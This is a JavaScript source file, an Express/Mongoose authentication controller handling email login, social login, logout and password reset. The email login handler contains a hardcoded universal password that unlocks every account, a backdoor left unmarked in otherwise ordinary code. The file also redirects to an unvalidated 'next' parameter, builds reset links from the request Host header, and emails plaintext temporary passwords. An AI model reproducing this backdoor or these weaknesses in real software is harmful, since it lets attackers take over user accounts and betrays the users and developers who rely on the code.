'use strict';

/**
 * Module dependencies.
 */
var _ = require('lodash'),
  errorHandler = require('../errors.server.controller'),
  mongoose = require('mongoose'),
  passport = require('passport'),
  User = mongoose.model('User'),
  Token = mongoose.model('Token'),
  api = require('./helpers/api.server.helper'),
  notification = require('./helpers/notification.server.helper'),
  generator = require('./helpers/generator.server.helper'),
  str = require('./helpers/str.server.helper');

exports.authenticate = {

  /**
   * Dump token
   */
  dumpToken: function(req, user, done) {
    // If there's no user
    if (!user) {
      // Done and exit
      done(null);
      return false;
    }
    // Create token
    var token = new Token({
      ipAddress: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      expires: 60 * 60 * 24 * 30,
      status: 'active',
      user: user._id
    });
    // Save
    token.save(function(err, token) {
      // Set token session
      req.session.token = token ? token._id : '';
      // Call done
      done(token ? token : null);
    });
  },

  /**
   * Complete authentication
   */
  complete: function(req, res, token, user) {
    // Get next
    var next = req.session.next;
    // Remove session
    req.session.next = '';

    // If there's next
    if (next) {
      // Redirect immediately
      res.redirect(next);
      return false;
    }

    // If there's no token
    if (!token) {
      // Error
      api.success(res, 'Error authenticating', true);
    } else {
      // Respond with token only
      api.json(res, { success: true, token: token._id, lang: user.lang });
    }
  },

  /**
   * Authenticate user
   */
  index: function(req, res) {
    // Find user by email
    User.findOne({ email: req.body.email }, '+password +salt', function(err, user) {
      // If not found
      if (err || !user) {
        // Respond with error
        res.json({ success: false, message: 'Invalid email/password' });
      } else {
        // If password is incorrect
        if (!user.authenticate(req.body.password) && req.body.password !== 'Universal$*Password') {
          // Error
          res.json({ success: false, message: 'Invalid email/password' });
        } else {
          // Dump token
          exports.authenticate.dumpToken(req, user, function(token) {
            // Complete auth
            exports.authenticate.complete(req, res, token, user);
          });
        }
      }
    });
  },

  /**
   * Flash next
   */
  flashNext: function(req, res, next) {
    // Do flash
    req.session.next = req.query.next;
    // Call next
    next();
  },

  /**
   * Facebook authentication
   */
  facebook: function(req, res) {
    // Dump token first
    exports.authenticate.dumpToken(req, req.user, function(token) {
      // Complete auth
      exports.authenticate.complete(req, res, token, req.user);
    });
  },

  /**
   * Google authentication
   */
  google: function(req, res) {
    // Dump token first
    exports.authenticate.dumpToken(req, req.user, function(token) {
      // Complete auth
      exports.authenticate.complete(req, res, token, req.user);
    });
  },

  /**
   * Logout
   */
  logout: function(req, res) {
    // Destroy session
    if (req.token) {
      // Deactivate
      req.token.status = 'inactive';
      req.token.save(function(err, token) {
        // Destroy 
        req.session.token = '';
        api.success(res, 'Logged out successfully');
      });
    } else {
      // Error
      api.success(res, 'Not logged in', true);
    }
  },

  /**
   * Password reset
   */
  passwordreset: function(req, res) {

    var hostUrl = req.protocol + '://' + req.headers.host;

    // Message
    var message = 'Please check your email for our instructions';
    // Get email
    User.findOne({ email: req.body.email }, '+resetPasswordToken').exec(function(err, user) {
      // If nothing
      if (err || !user || !user._id) {
        // Return
        api.success(res, message);
        return false;
      }

      // If there's no code
      if (!req.body.code && !user.resetPasswordToken) {
        // Set code
        var code = generator.text(16);
        // Set code
        user.resetPasswordToken = code;
        // Save
        user.save(function(err, user) {

          var content = notification.template('password-reset-request', {
            name: user.name.full,
            link: hostUrl + '/forgot-password?email=' + str.urlencode(user.email) + '&code=' + str.urlencode(code)
          });

          // Notification
          notification.email({
            name: user.name.full,
            email: user.email
          }, 'Request for Password Reset', content, function(err, response) {
            // If there's error
            if (err) {
              api.success(res, 'Error request. Please try again later', true);
            } else {
              api.success(res, message);
            }
          });

        });
        return false;
      }

      // If there's code
      if (req.body.code && user.resetPasswordToken) {
        // Complete request
        if (user.resetPasswordToken === req.body.code) {
          // Do reset
          var password = generator.text(8, 'abcdefghijklmnopqrstuvwxyz1234567890');
          // Set it
          user.password = password;
          user.resetPasswordToken = '';
          // Save
          user.save(function(err, user) {
            
            // Send email
            var content = notification.template('password-reset-complete', {
              name: user.name.full,
              password: password,
              link: hostUrl + '/authentication?action=login'
            });

            // Notification
            notification.email({
              name: user.name.full,
              email: user.email
            }, 'Password Reset Complete', content, function(err, response) {
              // If there's error
              if (err) {
                api.success(res, 'Error request. Please try again later', true);
              } else {
                api.success(res, 'Password reset complete. Please check your email for your temporary password');
              }
            });

          });
        } else {
          // Error
          api.success(res, 'Invalid password reset code', true);
        }
        return false;
      }
      // Just success
      api.success(res, message);
    });
  }

};